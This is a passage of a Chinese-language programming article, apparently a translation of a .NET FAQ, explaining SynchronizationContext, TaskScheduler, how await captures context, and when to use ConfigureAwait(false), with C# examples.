<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] arg</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> cesp = <span class="keyword">new</span> ConcurrentExclusiveSchedulerPair();</span><br><span class="line">        Task.Factory.StartNew(() =&gt; &#123;</span><br><span class="line">            Console.WriteLine(TaskScheduler.Current == cesp.ExclusiveScheduler);</span><br><span class="line">        &#125;, <span class="keyword">default</span>, TaskCreationOption.None, cesp.ExclusiveScheduler).Wait();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;有趣的是，<code>TaskScheduler</code>提供一个静态的方法<code>FromCurrentSynchronizationContext</code>，它创建一个新的调度器，那些排队的任务在任意的返回的<code>SynchronizationContext.Current</code>都会运行，使用它的<code>Post</code>方法为任务进行排队。</p>
<h1 id="SynchronizationContext-和-TaskScheduler-相关如何等待"><a href="#SynchronizationContext-和-TaskScheduler-相关如何等待" class="headerlink" title="SynchronizationContext 和 TaskScheduler 相关如何等待"></a>SynchronizationContext 和 TaskScheduler 相关如何等待</h1><p>&emsp;&emsp;考虑到一个 UI app 使用 Button。一旦点击这个按钮，我们想要从网站下载一个文本，以及设置这个 Button 的文本内容。并且这个 Button 只能被当前的 UI 线程访问，该线程拥有它，所以当我们成功下载新的日期和时间文本，并且想要存储回 Button 的 Content 值，我们只需要做的就是访问该控件所属的线程。如果不这样，我们就会得到这样一个错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.InvalidOperationException: &apos;The calling thread cannot access this object because a different thread owns it.&apos;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如果我们手写出来，我们可以使用前面显示的<code>SynchronizationContext</code>设置的<code>Current</code>封送回原始上下文，就如<code>TaskScheduler</code></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> HttpClient s_httpClient = <span class="keyword">new</span> HttpClient();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">downloadBtn_Click</span>(<span class="params"><span class="keyword">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s_httpClient.GetStringAsync(<span class="string">"http://example.com/currenttime"</span>).ContinueWith(downloadTask =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        downloadBtn.Content = downloadTask.Result;</span><br><span class="line">    &#125;, TaskScheduler.FromCurrentSynchronizationContext());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;或者直接使用<code>SynchronizationContext</code>：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> HttpClient s_httpClient = <span class="keyword">new</span> HttpClient();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">downloadBtn_Click</span>(<span class="params"><span class="keyword">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SynchronizationContext sc = SynchronizationContext.Current;</span><br><span class="line">    s_httpClient.GetStringAsync(<span class="string">"http://example.com/currenttime"</span>).ContinueWith(downloadTask =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        sc.Post(<span class="keyword">delegate</span></span><br><span class="line">        &#123;</span><br><span class="line">            downloadBtn.Content = downloadTask.Result;</span><br><span class="line">        &#125;, <span class="literal">null</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这些方法都是显式使用了回调函数。我们应该用<code>async</code>/<code>await</code>写下面非常自然的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> HttpClient s_httpClient = <span class="keyword">new</span> HttpClient();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">downloadBtn_Click</span>(<span class="params"><span class="keyword">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> text = <span class="keyword">await</span> s_httpClient.GetStringAsync(<span class="string">"http://example.com/currenttime"</span>);</span><br><span class="line">    downloadBtn.Content = text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这么做才能成功的在 UI 线程上设置<code>Content</code>的值，因为这和上面手动实现的版本一样，在默认情况下，这个正在等待 Task 只会关注<code>SynchronizationContext.Current</code>，与<code>TaskScheduler.Current</code>一样。在C#中，当你一旦使用<code>await</code>，编译器就会转换代码去请求（调用<code>GetAwaiter</code>）这个可等待的（在这个例子中就是<code>Task</code>）等待者（在例子中说的就是<code>TaskAwaiter&lt;string&gt;</code>）（原文：ask the “awaitable” for an “awaiter”）。而等待着的责任就是负责连接（调用）回调函数（经常性的作为一个 “continuation“），当这个等待的对象已经完成的时候，它会在状态机里触发回调，以及只要在回调函数一旦在某个时间点注册，它所做的就是捕捉上下文/调度器。尽管没有用确切的代码（这里有额外的优化和工作上的调整），它看起来就像这样：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> scheduler = SynchronizationContext.Current;</span><br><span class="line"><span class="keyword">if</span> (scheduler <span class="keyword">is</span> <span class="literal">null</span> &amp;&amp; TaskScheduler.Current != TaskScheduler.Default)</span><br><span class="line">&#123;</span><br><span class="line">    scheduler = TaskScheduler.Current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;换句话说，就是首先判断 scheduler 是否有被赋值过，如果没有，那是否还有非默认的<code>TaskScheduler</code>。如果有，那么在当准备好调用回调函数的时候，它将使用的是这个捕捉到的调度器；否则它一般调用回调函数作为这个等待的 task 操作完成时的一部分。</p>
<h1 id="ConfigureAwait-false-做了什么事"><a href="#ConfigureAwait-false-做了什么事" class="headerlink" title="ConfigureAwait(false) 做了什么事"></a>ConfigureAwait(false) 做了什么事</h1><p>&emsp;&emsp;<code>ConfigureAwait</code>方法并没有什么特别的：编译器或者运行时不会以任何特殊的方式识别出它。它只是简单的返回一个结构体（<code>ConfigureTaskAwaitable</code>），它包装了原始的 task，被调用时指定了一个布尔值。要记住，<code>await</code>能用在任何正确的模式下的任何类。通过返回不同的类型，即当编译器访问<code>GetAwaiter</code>方法（是这模式的一部分）返回的实例，它是从<code>ConfigureAwait</code>返回的类型，而不是任务 task 直接返回的，并且它提供了一个钩子（hook），这个钩子通过自定义的 awaiter 改变了行为。<br>&emsp;&emsp;特别是，不是等待从<code>ConfigureAwait(continueOnCapturedContext: false)</code>返回的类型，与其等待 Task，还不如直接在前面显示的逻辑的那样，捕获这个上下文/调度器。上一个展示的逻辑看起来就会像下面一样更加有效：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> scheduler = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (continueOnCapturedContext)</span><br><span class="line">&#123;</span><br><span class="line">    scheduler = SynchronizationContext.Current;</span><br><span class="line">    <span class="keyword">if</span> (scheduler <span class="keyword">is</span> <span class="literal">null</span> &amp;&amp; TaskScheduler.Current != TaskScheduler.Default)</span><br><span class="line">    &#123;</span><br><span class="line">        scheduler = TaskScheduler.Current;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;也就是说，通过指定一个 <em>false</em> ，即使这里有要回调的当前上下文或调度器，它也会假装没有。</p>
<h1 id="为什么我会要用到-ConfigureAwait-false"><a href="#为什么我会要用到-ConfigureAwait-false" class="headerlink" title="为什么我会要用到 ConfigureAwait(false)"></a>为什么我会要用到 ConfigureAwait(false)</h1><p>&emsp;&emsp;<code>ConfigureAwait(continueOnCapturedContext: false)</code>主要用来避免在原始上下文或调度器上强制调用回调。这有以下好处：<br>&emsp;&emsp;<strong>提高性能</strong>。这里主要的开销就是回调会排队入队列而不仅仅只是调用回调，它们都还要涉及其它额外的工作（比如指定额外的分配），也是因为它在某些我们想要的优化上，在运行时是不能使用的（当我们明确的知道回调函数是如何调用的时候，我们能做更多的优化，但是如果它被随意的传递给一个实现抽象的类，我们有时就会受到限制）。对于每次热路径（hot paths），甚至是检查当前的<code>SynchronizationContext</code>以及<code>TaskScheduler</code>的所花的额外开销（它们都涉及到访问静态线程），这些都会增加一定量的开销。如果<code>await</code>后边的代码实际上在原始上下文中没有长时间运行，使用<code>ConfigureAwait(false)</code>就能避免前面提到的所有的开销：它根本不需要入队列，它能运用它所有能优化的点，并且避免不必要的静态线程访问。<br>&emsp;&emsp;<strong>避免死锁</strong>。有一个库方法，它在网络下载资源，并在其结果上使用<code>await</code>。你调用它并且同步阻塞等待结果的返回，比如通过操作返回的<code>Task</code>使用<code>.Wait()</code>、<code>.Result</code>、<code>.GetAwaiter().GetResult()</code>。那现在我们来考虑一下，在当前上下文在受操作数量限制运行为 1 时（<code>SynchronizationContext</code>），如果你调用它会发生什么，它是否像早前显示的 <em>MaxConcurrencySynchronizationContext</em> 那样，又或者是隐含的只有一个线程能使用的上下文，例如 UI 线程。所以你在一个线程上调用方法，然后阻塞它到网络下载任务完成。这个操作会启动网络下载并等待它。因为在默认情况下，这个操作会捕捉当前的同步上下文，之所以它会这么做，是因为当网络下载任务完成之后，它会入队列返回<code>SynchronizationContext</code>，回调函数会调用剩余的操作。（原文： it does so, and when the network download completes, it queues back to the <code>SynchronizationContext</code> the callback that will invoke the remainder of the operation）。但是只有一个线程能处理这个已经入队列的回调函数，而且就是当前由于你的代码因这个操作等待完成而被阻塞的线程。这个操作除非这个回调函数已被处理，否则是不会完成的。这就发生了死锁！（回调函数相关的线程上下文又被阻塞）这种情况也会发生在没有限制并发，哪怕是 1 的情况，一旦资源以任何方式受到限制的时候也是如此。除了使用 <em>MaxConcurrencySynchronizationContext</em> 设置限度为 4，想象一下相同的场景。与其只让其中一个操作调用，我们可以入四个上下文来调用，它们每一个都会调用并阻塞等待它完成。现在我还是阻塞全部的资源，当等待异步访问完成的时候，只有一件事，即如果它们的回调函数能够被完全使用的上下文处理，那么就允许那些异步方法完成。再一次，死锁。</p>
<p>&emsp;&emsp;取而代之的是库方法使用<code>ConfigureAwait(false)</code>，那它就不会将回调入队列给原始上下文，这样就避免了死锁的场景。</p>
<h1 id="为什么我会要用到-ConfigureAwait-true"><a href="#为什么我会要用到-ConfigureAwait-true" class="headerlink" title="为什么我会要用到 ConfigureAwait(true)"></a>为什么我会要用到 ConfigureAwait(true)</h1><p>&emsp;&emsp;除非你纯粹是想要表明你明确不会使用<code>ConfigureAwait(false)</code>（例如来消除（silence）静态分析警告或类似的警告）而使用它，否则你没必要用到。<code>ConfigureAwait(true)</code>没有意义。当去比较<code>await task</code>和<code>await task.ConfigureAwait(true)</code>时，它们是一样的。如果你在生产代码中看到有<code>ConfigureAwait(true)</code>，你可以毫不犹豫的删掉它。<br>&emsp;&emsp;<code>ConfigureAwait</code>接受一个布尔值，是因为有一些合适的场景，其中你可能想要一个变量来控制配置。但是 99% 的使用案例都是使用硬编码传递一个固定的 <em>false</em> 参数，即<code>ConfigureAwait(false)</code>。</p>
<h1 id="合适应该用-ConfigureAwait-false"><a href="#合适应该用-ConfigureAwait-false" class="headerlink" title="合适应该用 ConfigureAwait(false)"></a>合适应该用 ConfigureAwait(false)</h1><p>&emsp;&emsp;这取决于：你实现的应用程序代码或是通用目的的库代码？<br>&emsp;&emsp;当在编写应用程序时，你一般想要默认行为（它为什么要默认行为）。如果一个app 模型/环境（如 Windows Forms，WPF，ASP.NET Core 等等）发布一个自定义的<code>SynchronizationContext</code>，这大部分无疑都有一个好理由：它提供了一种代码方式，它关心同步上下文与 app 模型/环境适当的交互。所以如果你在 Windows Forms 应用程序编写一个事件处理程序，在 xunit 编写一个单元测试，在 ASP.NET MVC 编写一个控制器，无论这个 app 模型实际上是否发布了这个<code>SynchronizationContext</code>，如果它存在你就可以想使用它。其意思就是默认情况（即<code>ConfigureAwait(true)</code>）。你只需要简单地使用<code>await</code>，然后正确的事情就会发生，它维护回调/延续会被传递回原始的上下文，如果它存在。这就回产生一个标准：如果你在应用程序级别的代码，不需要用<code>ConfigureAwait(false)</code>。如果你回想下前面的点击事件处理程序的例子，就像下面代码这样：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> HttpClient s_httpClient = <span class="keyword">new</span> HttpClient();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">downloadBtn_Click</span>(<span class="params"><span class="keyword">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> text = <span class="keyword">await</span> s_httpClient.GetStringAsync(<span class="string">"http://example.com/currenttime"</span>);</span><br><span class="line">    downloadBtn.Content = text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;值设置<code>downloadBtn.Content = text</code>它需要返回到原始的上下文。如果代码违反了这个准则，在不该使用<code>ConfigureAwait(false)</code>的地方使用了它：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> HttpClient s_httpClient = <span class="keyword">new</span> HttpClient();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">downloadBtn_Click</span>(<span class="params"><span class="keyword">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">string</span> text = <span class="keyword">await</span> s_httpClient.GetStringAsync(<span class="string">"http://example.com/currenttime"</span>).ConfigureAwait(<span class="literal">false</span>); <span class="comment">// bug</span></span><br><span class="line">    downloadBtn.Content = text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这样其结果就是坏行为。这在 ASP.NET 中以来的<code>HttpContext.Current</code>也是一样的；使用<code>ConfigureAwait(false)</code>并且尝试使用<code>HttpContext.Current</code>，可能回导致一些问题。<br>&emsp;&emsp;与之比较，通用类库被称为“通用”，一部分原因是因为使用者不关心他们具体使用的环境。你可以在 web app 使用它们，也可以在客户端 app 使用它们，或者是测试，它都不关心，一个类库被用到哪个 app 模型是未知的。变得不可未知就是说它们没准备做任何事，在 app 中以特殊的方式与之交互，例如它不会访问 UI 控件，因为通用类库对你的 UI 控件一无所知。由于我们不会在特定的环境中运行代码，这样我们就能避免强制 continuation / callback 回传给原始上下文，我们做的就是调用<code>ConfigureAwait(false)</code>，并且它会带来性能和可靠性的好处。这样就会产生通用的准则：如果你在编写通用类库，那么你就应该使用<code>ConfigureAwait(false)</code>。这就是原因，例如，在 .NET Core 运行时类库中，你到处可见（或绝大多数）在使用<code>ConfigureAwait(false)</code>的地方使用了<code>await</code>；有极少数例外，如果没有的话，那有可能是 bug 被修复了。例如<a href="https://github.com/dotnet/corefx/pull/38610" target="_blank" rel="noopener">这个 PR</a>，它修复了在<code>HttpClient</code>中忘记调用<code>ConfigureAwait(false)</code>。<br>&emsp;&emsp;既然是作为准则，当然也有例外的地方它是没有意义的。举个例子，有一个较大的例外（或者说至少需要考虑的一种情况），在通用类库中，那些需要调用的委托的 api。这种情况，类库调用者要传递可能会被库调用的应用程序级别的代码，这会有效的会使库的那些通用的假设变得毫无意义（In such cases, the caller of the library is passing potentially app-level code to be invoked by the library, which then effectively renders those “general purpose” assumptions of the library moot）。考虑以下例子，一个异步版本的 Linq 的 <code>Where</code> 方法如<code>public static async IAsyncEnumerable&lt;T&gt; WhereAsync(this IAsyncEnumerable&lt;T&gt; source, Func&lt;T,bool&gt; predicate)</code>这里的 <em>predicate</em> 必须要在调用者的原<code>ConfigureAwait(false)</code>。<br>&emsp;&emsp;这些特殊的例子，通用的标准就是一个非常好的开始点：如果你正在写类库/应用程序级未知的代码，那么请使用<code>ConfigureAwait(false)</code>，否则不要使用。</p>
<h1 id="ConfigureAwait-false-会保证回调不会在原始上下文运行吗"><a href="#ConfigureAwait-false-会保证回调不会在原始上下文运行吗" class="headerlink" title="ConfigureAwait(false) 会保证回调不会在原始上下文运行吗"></a>ConfigureAwait(false) 会保证回调不会在原始上下文运行吗</h1><p>&emsp;&emsp;不，它保证它不会把回调入队列到原始上下文。但是这并不意味着在代码<code>await task.ConfiureAwait(false)</code>后面就不会运行在原始上下文中。那是因为在已经完成的可等待者上等待，它只需要同步地运行<code>await</code>，而不用强制到入队列返回。所以你在 await 一个 task，它早就在它等待的时间内完成了，无论你是否使用了<code>ConfigureAwait(false)</code>，代码会在之后在当前线程上立即执行，无论这个上下文是否还是当前的。</p>
<h1 id="只在方法中只第一次用-await-用-ConfigureAwait-false-以及剩下的代码不用可以吗"><a href="#只在方法中只第一次用-await-用-ConfigureAwait-false-以及剩下的代码不用可以吗" class="headerlink" title="只在方法中只第一次用 await 用 ConfigureAwait(false) 以及剩下的代码不用可以吗"></a>只在方法中只第一次用 await 用 ConfigureAwait(false) 以及剩下的代码不用可以吗</h1><p>&emsp;&emsp;一般情况下是不行的。见上一个 FAQ。如果这个<code>await task.ConfigureAwait(false)</code>涉及到这个 task 在其等待的时间内已经完成了（这种情况极其容易发生），那么<code>ConfigureAwait(false)</code>就显得没有意义了，这个线程会继续执行这个异步方法之后的代码，并且与之前具有相同的上下文。<br>&emsp;&emsp;一个重要的例外就是，如果你知道第一次 await 总是会异步的完成，并且这个等待的将会调用回调，在一个自定义同步上下问和调度器的自由的环境。举个例子，CryptoStream 是 .NET 运行时类库的类，它确保了密集型计算的代码不会作为同步调用者调用的一部分运行，所以它使用了<a href="https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/src/libraries/System.Security.Cryptography.Primitives/src/System/Security/Cryptography/CryptoStream.cs#L205" target="_blank" rel="noopener">自定义的 awaiter</a> 来确保所有事情在第一次 await 之后都会运行在线程池线程下。然而，在那个例子中，你将会注意到下个 await 仍然使用了<code>ConfiureAwait(false)</code>；在技术上，这是没必要的，但是它会让代码看起来更加容易，否则每次看到这个代码的时候，都不要分析去理解为什么不用<code>ConfiureAwait(false)</code>。</p>
<h1 id="我能使用-Task-Run-从而避免使用-ConfigureAwait-false-吗"><a href="#我能使用-Task-Run-从而避免使用-ConfigureAwait-false-吗" class="headerlink" title="我能使用 Task.Run 从而避免使用 ConfigureAwait(false) 吗"></a>我能使用 Task.Run 从而避免使用 ConfigureAwait(false) 吗</h1><p>&emsp;&emsp;对，如果你这么写：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Task.Run(<span class="keyword">async</span> <span class="keyword">delegate</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">await</span> SomethingAsync(); <span class="comment">// 将看不到原始上下文</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在 SomethingAsync() 之后调用<code>ConfigureAwait(false)</code>将会是一个空操作，因为这个委托作为参数传递给<code>Task.Run</code>，它将在线程池线程上执行，堆栈上没有更高级别的用户代码，如<code>SynchronizationContext.Current</code>就会返回 <em>null</em> 。尽管如此，<code>Task.Run</code>隐含的使用了<code>TaskScheduler.Default</code>，它的意思在里边查找 <code>TaskScheduler.Current</code>，其委托也会返回<code>Default</code>。这意思就是说不管你是否使用了<code>ConfigureAwait(false)</code>，它都会展示相同的行为。同时它也不会做任何保证 lambda 里面的代码会执行。如果你有如下代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Task.Run(<span class="keyword">async</span> <span class="keyword">delegate</span></span><br><span class="line">&#123;</span><br><span class="line">    SynchronizationContext.SetSynchronizationContext(<span class="keyword">new</span> SomeCoolSyncCtx());</span><br><span class="line">    <span class="keyword">await</span> SomethingAsync(); <span class="comment">// will target SomeCoolSyncCtx</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在 SomethingAsync 里面的代码实际上将会看到<code>SynchronizationContext.Current</code>实例对象就是 <em>SomeCoolSyncCtx</em> ，await和任何没有配置的await，这两者在 SomethingAsync 内都会返回给它。所以为了使用这个方法，你必须要理解你可能正在排队的代码做的所有事情或有可能什么也没做，以及这个操作是否会组织你的操作。<br>&emsp;&emsp;这个方法的代价就是需要创建/排队一个额外的任务对象。这对于你的 app 或类库是否重要，取决于你的性能敏感度。<br>&emsp;&emsp;还要记住，这些技巧可能会导致更多问题乃至超过它们的价值，并会产生其他意想不到的结果。例如，静态分析工具（如 Roslyn 分析器）已经写了一个去表示等待时它不会使用<code>ConfigureAwait(false)</code>，如<a href="https://docs.microsoft.com/en-us/visualstudio/code-quality/ca2007?view=vs-2019" target="_blank" rel="noopener">CA2007</a>。如果你启用了这样一个分析器，随后又使用了一些技巧来避免使用<code>ConfigureAwait(false)</code>，那么分析器就会去标记它，并且实际上会为你做更多事。那么如果你之后因为它吵闹（noisiness）又关闭了分析器，最后你会在代码里会丢失你实际上应该要调用<code>ConfigureAwait(false)</code>。</p>
<h1 id="我能使用-SynchronizationContext-SetSynchronizationContext-来避免使用-ConfigureAwait-false-吗"><a href="#我能使用-SynchronizationContext-SetSynchronizationContext-来避免使用-ConfigureAwait-false-吗" class="headerlink" title="我能使用 SynchronizationContext.SetSynchronizationContext 来避免使用 ConfigureAwait(false) 吗"></a>我能使用 SynchronizationContext.SetSynchronizationContext 来避免使用 ConfigureAwait(false) 吗</h1><p>&emsp;&emsp;不，好吧，也许吧。它取决于具体设计的代码。</p>
<p>&emsp;&emsp;一些开发者可能会写下面这样的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Task t;</span><br><span class="line">SynchronizationContext old = SynchronizationContext.Current;</span><br><span class="line">SynchronizationContext.SetSynchronizationContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    t = CallCodeThatUsesAwaitAsync(); <span class="comment">// 在这里不会看到原始上下文</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123; SynchronizationContext.SetSynchronizationContext(old); &#125;</span><br><span class="line"><span class="keyword">await</span> t; <span class="comment">// 仍然会得到原始上下文</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们希望看到在 CallCodeThatUsesAwaitAsync 代码里的当前上下文是 <em>null</em> 。并且的确如此。然而，上面代码将不会影响<code>await TaskScheduler.Current</code>的等待结果，所以如果代码在自定义的<code>TaskScheduler</code>上运行，<code>await CallCodeThatUsesAwaitAsync</code>（这里不会使用<code>ConfigureAwait(false)</code>）将会看到并排队返回的自定义<code>TaskScheduler</code>。<br>&emsp;&emsp;这里所有相同的警告同样应用前面的<code>Task.Run</code>相关的 FAQ：这里的变通方法有性能的含义，而在 try 中的代码也可以通过设置不同的上下文来组织这些尝试（或者通过非默认的调度器调用代码）。<br>&emsp;&emsp;使用这种模式，你需要小心这种细微的差异：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SynchronizationContext old = SynchronizationContext.Current;</span><br><span class="line">SynchronizationContext.SetSynchronizationContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">await</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123; SynchronizationContext.SetSynchronizationContext(old); &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;发现问题了么？这是很难发现但同时又是潜在的问题又很大的。这里它无法保证 await 将会在原始上下文中调用 callback / continuation，就是说重新设置<code>SynchronizationContext</code>返回给原始上下文也许不会发生在原始线程，最终的结果就会导致在这个线程的后续工作上会看到错误的上下文（为了解决这个问题，需要编写一个在调用任何用户代码之前通常是要手动重设自定义同步上下文，这是一个良好的应用模式）。即使它发生了在相同的线程上运行，在此之前也需要一段时间，这种上下文这段时间内不会得到适当的修复。但如果它运行在不同的线程上，它最终将在那个线程设置错的上下文。如此等等，这非常不理想。</p>
<h1 id="我正使用-GetAwaiter-GetResult-。我还需要使用-ConfigureAwait-false-吗"><a href="#我正使用-GetAwaiter-GetResult-。我还需要使用-ConfigureAwait-false-吗" class="headerlink" title="我正使用 GetAwaiter().GetResult() 。我还需要使用 ConfigureAwait(false) 吗"></a>我正使用 GetAwaiter().GetResult() 。我还需要使用 ConfigureAwait(false) 吗</h1><p>&emsp;&emsp;不，ConfigureAwait 只影响回调。特别是，awaiter 模式要求要求公开一个<code>IsCompleted</code>属性，<code>GetResult</code>方法以及一个<code>OnCompleted</code>方法（作为可选择的，还有方法<code>UnsafeOnCompleted</code>）。ConfigureAwait 只影响<code>{Unsafe}OnCompleted</code>的行为，所以如果你只是直接调用 awaiter 的<code>GetResult</code>方法，无论你是在<code>TaskAwaiter</code>或是<code>ConfiguredTaskAwaitable.ConfiguredTaskAwaiter</code>做的任何事，这没有任何不同。所以如果你在代码中看到<code>task.ConfigureAwait(false).GetAwaiter().GetResult()</code>这样的代码，你可以用<code>task.GetAwaiter().GetResult()</code>替换（不过你还是得考虑你是否真的想阻塞它）。</p>
<h1 id="我知道我在环境中运行，绝不会用到自定义同步上下文或任务调度器。那我能跳过使用-ConfigureAwait-false-吗"><a href="#我知道我在环境中运行，绝不会用到自定义同步上下文或任务调度器。那我能跳过使用-ConfigureAwait-false-吗" class="headerlink" title="我知道我在环境中运行，绝不会用到自定义同步上下文或任务调度器。那我能跳过使用 ConfigureAwait(false) 吗"></a>我知道我在环境中运行，绝不会用到自定义同步上下文或任务调度器。那我能跳过使用 ConfigureAwait(false) 吗</h1><p>&emsp;&emsp;也许。它取决于你是如何保证“绝不”的。上一个 FAQ 需要注意的是，因为你正在工作的 app 模型不会设置自定义的同步上下文并且也不会在自定义的任务调度器上调用你的代码，不意味着一些其他的用户或库代码没有这么做。所以你得保证那中情况不会发生，或者至少估量它可能的风险。</p>
<h1 id="我听说在-NET-Core-中-ConfigureAwait-false-已经不在必要了，是真的吗"><a href="#我听说在-NET-Core-中-ConfigureAwait-false-已经不在必要了，是真的吗" class="headerlink" title="我听说在 .NET Core 中 ConfigureAwait(false) 已经不在必要了，是真的吗"></a>我听说在 .NET Core 中 ConfigureAwait(false) 已经不在必要了，是真的吗</h1><p>&emsp;&emsp;不。它还是需要的，当在.NET Core中它与在 .NET Framework 运行需要的理由同样明确。在这方面并没有任何改变。</p>
